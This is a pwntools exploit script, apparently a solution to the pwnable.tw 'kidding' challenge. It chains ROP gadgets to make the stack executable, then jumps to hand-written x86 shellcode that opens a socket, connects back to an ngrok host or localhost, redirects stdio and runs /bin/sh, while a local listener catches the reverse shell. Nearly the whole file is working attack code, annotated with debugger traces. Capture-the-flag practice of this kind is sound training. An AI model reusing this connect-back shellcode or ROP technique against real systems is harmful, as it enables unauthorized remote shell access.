#!/usr/bin/env python3

from pwn import *
import socket

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("kidding_patched", checksec=False)

context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
b *0x0804888F
b *0x80bd13b
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10303
        return remote(host, port)

p = conn()

if args.LOCAL:
    ip = "127.0.0.1"
    port = 1337
else:
    ngrok_host = "0.tcp.ap.ngrok.io"
    ip = socket.gethostbyname(ngrok_host)
    port = 11143

# eax=0x66: sys_socketcall(ebx=0x1, ecx=[2,1,0]) -> socket(2,1,0)
# Lúc này eax = 0 nên mov al đc
shellcode = '''
    mov al, 0x66
    xor ebx, ebx
    push ebx
    inc ebx
    push ebx
    push 0x2
    mov ecx, esp
    int 0x80
'''

'''
   0xff9df8f0    mov    al, 0x66                  AL => 0x66
   0xff9df8f2    xor    ebx, ebx                  EBX => 0
   0xff9df8f4    push   ebx
   0xff9df8f5    inc    ebx                       EBX => 1
   0xff9df8f6    push   ebx
   0xff9df8f7    push   2
   0xff9df8f9    mov    ecx, esp                  ECX => 0xff9df8e4 ◂— 2
   0xff9df8fb    int    0x80 <SYS_socketcall>
'''

# eax=0x3f: dup2(ebx=0x0, ecx=0x1)
shellcode += '''    
    mov al, 0x3f
    dec ebx
    pop esi
    pop ecx
    int 0x80
'''

'''
 ► 0xff9df8fd    mov    al, 0x3f                  AL => 0x3f
   0xff9df8ff    dec    ebx                       EBX => 0
   0xff9df900    pop    esi                       ESI => 2
   0xff9df901    pop    ecx                       ECX => 1
   0xff9df902    int    0x80 <SYS_dup2>
'''

# eax=0x66: sys_socketcall(ebx=0x3, ecx=[0,&sockaddr_in,0x10]) -> connect(0,&sockaddr_in,0x10)
'''
struct sockaddr_in {
    uint16_t sin_family;   // 2 byte
    uint16_t sin_port;     // 2 byte
    uint32_t sin_addr;     // 4 byte
    char     sin_zero[8];  // 8 byte padding
};
'''
shellcode += f''' 
    mov al, 0x66
    mov bl, 0x3
    push {hex(u32(socket.inet_aton(ip)))}
    push {hex(u32(p16(socket.AF_INET) + p16(port, endian='big')))}
    mov ecx, esp
    push 0x10
    push ecx
    push 0x0
    mov ecx, esp
    int 0x80
'''

'''
 ► 0xff9df904    mov    al, 0x66                  AL => 0x66
   0xff9df906    mov    bl, 3                     BL => 3
   0xff9df908    push   0x100007f
   0xff9df90d    push   0x39050002
   0xff9df912    mov    ecx, esp
   0xff9df914    push   0x10
   0xff9df916    push   ecx
   0xff9df917    push   0
   0xff9df919    mov    ecx, esp
   0xff9df91b    int    0x80 <SYS_socketcall>
'''

# eax=0xb: execve(ebx='/bin/sh', ecx=0, ebx=0)
shellcode += '''
    mov al, 0xb
    push 0x68732f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
'''

'''
 ► 0xff9df91d    mov    al, 0xb                            AL => 0xb
   0xff9df91f    push   0x68732f
   0xff9df924    push   0x6e69622f
   0xff9df929    mov    ebx, esp
   0xff9df92b    xor    ecx, ecx                           ECX => 0
   0xff9df92d    xor    edx, edx                           EDX => 0
   0xff9df92f    int    0x80 <SYS_execve>
'''

pl = flat(
    0,0,
    # 0x8048902 (generic_start_main+66) —▸ 0x80e9fc8 (__libc_stack_end)
    0x8048902 - 0x18, # saved rbp
    # pop ecx ; ret
    0x080583c9,
    exe.symbols['_dl_make_stack_executable_hook'],
    # inc dword ptr [ecx] ; ret
    0x080842c8,
    # <_dl_map_object_from_fd.constprop.7+3328>
    0x80937f0,
    # jmp esp
    0x080bd13b,
) + asm(shellcode)

print("payload len =", len(pl))

listener = listen(1337)

s(p, pl)

ia(listener.wait_for_connection())